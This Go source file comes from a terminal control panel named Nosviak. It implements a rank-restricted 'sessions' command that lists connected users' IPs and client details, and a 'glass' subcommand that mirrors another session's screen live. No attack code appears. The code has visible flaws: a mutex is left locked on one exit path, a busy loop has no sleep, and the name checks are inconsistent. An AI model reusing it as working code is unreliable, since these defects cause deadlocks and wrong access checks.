package commands

import (
	"Nosviak/core/masters/sessions"
	"Nosviak/core/masters/users/pager"
	"Nosviak/core/masters/users/ranks"
	Toml "Nosviak/core/models/configs/toml"
	"Nosviak/core/models/util"
	"Nosviak/core/models/views"

	"strconv"
	"strings"

	"github.com/alexeyco/simpletable"
)

func init() {
	NewCommand(&Command{
		Name:           "sessions",
		Desciption:     "control/manage different sessions",
		MinPermissions: []string{"admin", "moderator", "reseller"},
		ZeroArguments: func(session *sessions.Session, args []string) error {

			//creates a new simpletable structure
			//this is used to store our table information so we can render it correctly
			NewTable := simpletable.New()

			//correctly sets the headers to what we are looking for
			//this allows more customiszation for the clients
			NewTable.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "     User     "},
					{Align: simpletable.AlignCenter, Text: "Connected"},
					{Align: simpletable.AlignCenter, Text: "IP"},
					{Align: simpletable.AlignCenter, Text: "Idle"},
					{Align: simpletable.AlignCenter, Text: "Ranks"},
				},
			}

			//ranges through all active sessions
			//this allows us to control a sessions better
			//also allows us to view who is connected from where
			for _, session := range sessions.Sessions {

				//gets the rank array from the users database correctly
				//this gives us access to the string of ranks the user has
				Ranks, err := ranks.UnravelRanks(session.User)
				if err != nil {
					return err
				}

				//creates a new table body cell
				//this shall give us access to the users information for this rotation
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: strconv.Itoa(session.User.Id)},
					{Align: simpletable.AlignLeft, Text: session.User.Username},
					{Align: simpletable.AlignCenter, Text: session.Connected.Format("15:04:05")},
					{Align: simpletable.AlignCenter, Text: strings.Split(session.Conn.RemoteAddr().String(), ":")[0]},
					{Align: simpletable.AlignCenter, Text: util.ResolveTimeStamp(session.Idle, false)},
					{Align: simpletable.AlignLeft, Text: ranks.CompileRanks(Ranks, Toml.DecorationToml.Gradient.Status && util.NeedleHaystack(Toml.DecorationToml.Gradient.CommissionedTables, "sessions"))},
				}
	
				//correctly saves into the array correctly
				//meaning it can be rendered inside the pager correctly
				NewTable.Body.Cells = append(NewTable.Body.Cells, r)
			}

			//finishes and passes the information into the pager correctly
			//this will be calculated and checked if we need to render it as a pager or default
			return pager.NewPager("sessions", NewTable, session).ExecutePager()
		},

		SubFeatures: []SubFeature{
			{
				//this command provides more information about users
				//this command views all active sessions with more information about the terminal/session
				Name:           "part2",
				Desciption:     "more information about the open sessions",
				MinPermissions: []string{"admin", "reseller"},
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//creates a new simpletable structure
					//this is the structure we will use to construct our tables
					NewTable := simpletable.New()

					//correctly sets the headers to what we are looking for
					//this allows more customiszation for the clients
					NewTable.Header = &simpletable.Header{
						Cells: []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: "     User     "},
							{Align: simpletable.AlignCenter, Text: "Stamp"},
							{Align: simpletable.AlignCenter, Text: "Client"},
							{Align: simpletable.AlignCenter, Text: "Written"},
							{Align: simpletable.AlignCenter, Text: "Terminal Size"},
						},
					}

					//ranges through all active sessions
			        //this allows us to control a sessions better
			        //also allows us to view who is connected from where
			        for _, session := range sessions.Sessions {


						//creates a new table body cell
				        //this shall give us access to the users information for this rotation
				        r := []*simpletable.Cell{
							{Align: simpletable.AlignLeft, Text: session.User.Username},
				        	{Align: simpletable.AlignCenter, Text: strconv.Itoa(int(session.Connected.Unix()))},
				        	{Align: simpletable.AlignCenter, Text: sessions.ResolveClientVersion(session.Conn.ClientVersion())},
				        	{Align: simpletable.AlignCenter, Text: strconv.Itoa(len(session.Written))},
							{Align: simpletable.AlignCenter, Text: strconv.Itoa(session.TerminalSize.W)+" x "+strconv.Itoa(session.TerminalSize.H)},
				        }

						//correctly saves into the array correctly
						//meaning it can be rendered inside the pager correctly
						NewTable.Body.Cells = append(NewTable.Body.Cells, r)
			        }

					if len(NewTable.Body.Cells) <= 0 {
						return views.NewDTX("zeroLengthTable.dtx", session.Write).ExecuteStandard(session.Channel)
					}



					//finishes and passes the information into the pager correctly
					//this will be calculated and checked if we need to render it as a pager or default
					return pager.NewPager("sessions", NewTable, session).ExecutePager()
				},
			},

			{
				//this command provides a screenshare type of experience
				//meaning you can view what other people are doing in there sessions from your own session
				Name:           "glass",
				Desciption:     "induces a screenshare type of experience",
				MinPermissions: []string{"admin", "reseller"},
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//checks that the length meets the correct length needed
					//also checks that the argumental lengths are safe to keep passing into the function
					if len(args) < 3 || len(args) >= 3 && len(strings.Split(args[2], "@")) != 2{
						return views.NewDTX("sessions-glass-missing-session.dtx", session.Write).Template(session, session.Channel)
					}

					//stores the atoi information
					//converts the session id into a integer meaning we can search the map for it
					sessionLooking, err := strconv.Atoi(strings.Split(args[2], "@")[1])
					if err != nil {
						return views.NewDTX("sessions-glass-invalid-id.dtx", session.Write).Template(session, session.Channel)
					}

					//trys to get the user from the session details
					//this will look inside the map for the key we are looking for
					gottonPast := sessions.Sessions[int64(sessionLooking)]
					if gottonPast == nil || gottonPast != nil && session.User.Username != strings.Split(args[2], "@")[0] {
						return views.NewDTX("sessions-glass-invalid-session.dtx", session.Write).Template(session, session.Channel)
					}

					//enforces the max glass viewer policy
					//fixs most concurrent map read issues
					if gottonPast.GlassViewers > 1 {
						return views.NewDTX("sessions-glass-too-many.dtx", session.Write).Template(session, session.Channel)
					}

					//sets the current capture to 0
					//this is how we will send the message the user wants to leave
					var capture int = 0

					//adds an additional viewer to the session
					sessions.Sessions[int64(sessionLooking)].GlassViewers++
					go func() {
						//waits till a keypress has been detected
						//this will be used to detect when the user wants to exit
						session.PauseTill()
						capture = 1
						sessions.Sessions[int64(sessionLooking)].GlassViewers--
					}()

					//stores the last line we viewed
					//this is used so we can check we are not printing the same thing constantly
					var lastrenderLine string


					for {
						//checks if there has been a keypress
						//if capture is bigger or equal to one there has been a keypress
						if capture >= 1 {
							//breaks from the for loop
							break
						}

						//locks the mutex meaning only this can execite it
						Mux.Lock()

						//requests the new client image
						//this will completely get all new information about the client
						gotton := sessions.Sessions[int64(sessionLooking)]
						if gotton == nil {
							break
						}

						//unlocks so everyone may access
						Mux.Unlock()

						//checks that the incoming event isn't a recurring event 
						//this makes sure we aren't stressing our client with constant updating
						if lastrenderLine != "" && lastrenderLine == gotton.Written[len(gotton.Written)-1] {
							//puts the updation into a sleep period
							//lowers stress on the server side client
							continue
						}

						//makes sure we print from the last renderable item point
						renderable := strings.Split(strings.Join(gotton.Written, ""), "\033c")[len(strings.Split(strings.Join(gotton.Written, ""), "\033c"))-1]

						//makes sure we clear the screen before rendering the buffer
						if _, err := session.Channel.Write([]byte("\033c")); err != nil {
							return err
						}
	
						//prints all written frames
						//this will make it so we can view this properly
						for _, frame := range renderable {

							//prints to our display correctly with err handling
							//we will also err handler this so we can detect them
							if _, err := session.Channel.Write([]byte(string(frame))); err != nil {
								return err
							}
						}

						//sets a bottom banner which will sync to the users window size
						//which will display information about who the user is currently viewing
						if err := session.MakeLowerBanner("viewing "+session.User.Username+"!", 234, 255); err != nil {
							return err
						}

						//saves the gotton last line in the array to the last render line
						//this is used so we can detect when a new line has been written
						lastrenderLine = gotton.Written[len(gotton.Written)-1]
					}

					point := strings.Split(strings.Join(session.Written, ""), "\033c")[len(strings.Split(strings.Join(session.Written, ""), "\033c"))-1]

					//makes sure we clear the screen before rendering the buffer
					if _, err := session.Channel.Write([]byte("\033c")); err != nil {
						return err
					}

					//renders everything before the last clear point
					if _, err := session.Write([]byte(point)); err != nil {
						return err
					}

					return nil
				},
			},
		},
	})
}
